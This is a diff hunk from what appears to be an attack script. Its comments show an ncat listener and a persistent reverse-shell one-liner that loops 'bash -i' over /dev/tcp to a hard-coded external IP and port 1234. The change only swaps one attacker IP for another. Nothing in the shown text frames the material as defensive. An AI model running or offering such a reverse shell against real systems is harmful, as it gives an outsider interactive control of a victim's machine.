@@ -11,7 +11,7 @@ set -x
 #   * ncat --listen 1234 --output $(mktemp /tmp/hack-XXXX.log)
 
 # On exploit
-# /bin/bash -c "while :; do nohup bash -i >& /dev/tcp/167.99.85.81/1234 0>&1; sleep 1; done"
+# /bin/bash -c "while :; do nohup bash -i >& /dev/tcp/167.99.200.158/1234 0>&1; sleep 1; done"
 
 # What can we do???
 
